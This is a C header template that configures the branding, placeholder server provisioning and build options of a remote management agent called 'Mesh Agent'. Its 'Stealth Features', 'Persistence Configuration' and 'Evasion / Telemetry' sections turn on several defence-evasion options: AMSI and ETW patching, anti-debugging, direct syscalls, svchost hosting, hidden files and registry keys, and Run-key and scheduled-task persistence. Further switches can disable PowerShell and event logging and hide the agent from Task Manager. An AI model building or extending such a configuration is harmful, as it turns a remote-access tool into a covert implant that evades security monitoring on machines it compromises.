#ifndef MESHCORE_CONFIG_BRANDING_PROFILE_TEMPLATE_H
#define MESHCORE_CONFIG_BRANDING_PROFILE_TEMPLATE_H

/*
    TEMPLATE BRANDING PROFILE
    -------------------------
    Copy this file to `meshcore/config/branding_profile.local.h` and replace the
    placeholder values with your real branding/provisioning data. The local copy
    is ignored by git so secrets never land in the repository.

        cp meshcore/config/branding_profile.template.h meshcore/config/branding_profile.local.h
*/

/* ===== Service Branding ===== */
#define MESH_AGENT_SERVICE_FILE         TEXT("MeshService")
#define MESH_AGENT_SERVICE_NAME         TEXT("Mesh Agent")
#define MESH_AGENT_DISPLAY_NAME         TEXT("Mesh Agent Service")
#define MESH_AGENT_COMPANY_NAME         "Contoso Corporation"
#define MESH_AGENT_PRODUCT_NAME         "Mesh Agent"
#define MESH_AGENT_FILE_DESCRIPTION     "Mesh Agent Service"
#define MESH_AGENT_INTERNAL_NAME        "meshagent.exe"
#define MESH_AGENT_ORIGINAL_FILENAME    "MeshAgent.exe"
#define MESH_AGENT_COPYRIGHT            "Copyright (c) Contoso Corporation"
#define MESH_AGENT_INSTALL_ROOT         TEXT("C:/ProgramData/MeshAgent")
#define MESH_AGENT_LOG_DIRECTORY        TEXT("C:/ProgramData/MeshAgent/logs")
#define MESH_AGENT_BINARY_NAME          TEXT("meshagent.exe")
#define MESH_AGENT_SVCHOST_DLL          TEXT("meshsvc.dll")
#define MESH_AGENT_ARTIFACT_DB          TEXT("meshagent.db")
#define MESH_AGENT_ARTIFACT_CONFIG      TEXT("meshagent.conf")
#define MESH_AGENT_ARTIFACT_LOG         TEXT("meshagent.log")

#define MESH_AGENT_FILE_VERSION_MAJOR   1
#define MESH_AGENT_FILE_VERSION_MINOR   0
#define MESH_AGENT_FILE_VERSION_BUILD   0
#define MESH_AGENT_FILE_VERSION_REVISION 0
#define MESH_AGENT_FILE_VERSION_STR     TEXT("1.0.0.0")

#define MESH_AGENT_PRODUCT_VERSION_MAJOR   1
#define MESH_AGENT_PRODUCT_VERSION_MINOR   0
#define MESH_AGENT_PRODUCT_VERSION_BUILD   0
#define MESH_AGENT_PRODUCT_VERSION_REVISION 0
#define MESH_AGENT_PRODUCT_VERSION_STR      TEXT("1.0.0.0")

/* ===== Network / Provisioning (testing only) ===== */
/*
    Network endpoints and provisioning data (MeshID, ServerID, etc.) should
    come from the .msh file that the server embeds at download time.
    These compile-time overrides are only active when MESH_PROVISIONING_HARDCODED
    is defined in the build configuration (test/lab builds).
*/
#ifdef MESH_PROVISIONING_HARDCODED
#define MESH_AGENT_NETWORK_ENDPOINT    "wss://your.mesh.server/agent.ashx"
#define MESH_AGENT_NETWORK_USER_AGENT  "MeshAgent/1.0"
#define MESH_AGENT_NETWORK_SNI         NULL
#define MESH_AGENT_NETWORK_HOST_HEADER NULL
#define MESH_AGENT_NETWORK_FALLBACK_COUNT 0
#define MESH_AGENT_NETWORK_FALLBACK_LIST { { NULL, NULL, NULL, NULL, NULL } }
#define MESH_TLS_MIN_VERSION           "TLS1.2"
#define MESH_TLS_MAX_VERSION           "TLS1.3"
#define MESH_ALPN_PROTOCOLS            "http/1.1"

#define MESH_AGENT_MESH_ID             "REPLACE_WITH_MESH_ID"
#define MESH_AGENT_SERVER_ID           "REPLACE_WITH_SERVER_ID"
#define MESH_AGENT_MESH_NAME           "Default Mesh"
#define MESH_AGENT_SERVER_URL          "wss://your.mesh.server/agent.ashx"
#define MESH_AGENT_MESH_TYPE           2
#define MESH_AGENT_INSTALL_FLAGS       "0"
#define MESH_AGENT_AUTO_REGISTER       1
#endif /* MESH_PROVISIONING_HARDCODED */

/* ===== Stealth Features ===== */
#define MESH_AGENT_STEALTH_ENABLED         1
#define MESH_AGENT_SVCHOST_MODE            1
#define MESH_AGENT_HIDE_FILES              1
#define MESH_AGENT_HIDE_REGISTRY           1
#define MESH_AGENT_AMSI_PATCH              1
#define MESH_AGENT_ETW_PATCH               1
#define MESH_AGENT_ANTI_DEBUG              1
#define MESH_AGENT_SYSCALLS_DIRECT         1
#define MESH_AGENT_BUNDLE_EXTRACT_DEFAULT  1

/* ===== Persistence Configuration ===== */
#define MESH_AGENT_PERSIST_RUNKEY          1
#define MESH_AGENT_PERSIST_TASK            1
#define MESH_AGENT_PERSIST_WMI             0
#define MESH_AGENT_PERSIST_WATCHDOG        0
#define MESH_AGENT_PERSIST_RECOVERY_ENABLED 0
#define MESH_AGENT_PERSIST_RECOVERY_RESET_PERIOD 86400
#define MESH_AGENT_PERSIST_RECOVERY_RESTART_DELAY_MS 10000
#define MESH_AGENT_PERSIST_RECOVERY_ACTIONS TEXT("restart,restart,restart")

/* ===== Evasion / Telemetry ===== */
#define MESH_AGENT_DISABLE_PS_LOGGING      0
#define MESH_AGENT_DISABLE_EVENT_LOGS      0
#define MESH_AGENT_DISABLE_ETW             0
#define MESH_AGENT_HIDE_TASKMANAGER        0
#define MESH_AGENT_USE_SYSCALLS            0

/* ===== Signing Allowlist (example only) ===== */
#define MESH_AGENT_ALLOWED_SIGNERS_COUNT   0
#define MESH_AGENT_ALLOWED_SIGNERS         { }

#endif /* MESHCORE_CONFIG_BRANDING_PROFILE_TEMPLATE_H */
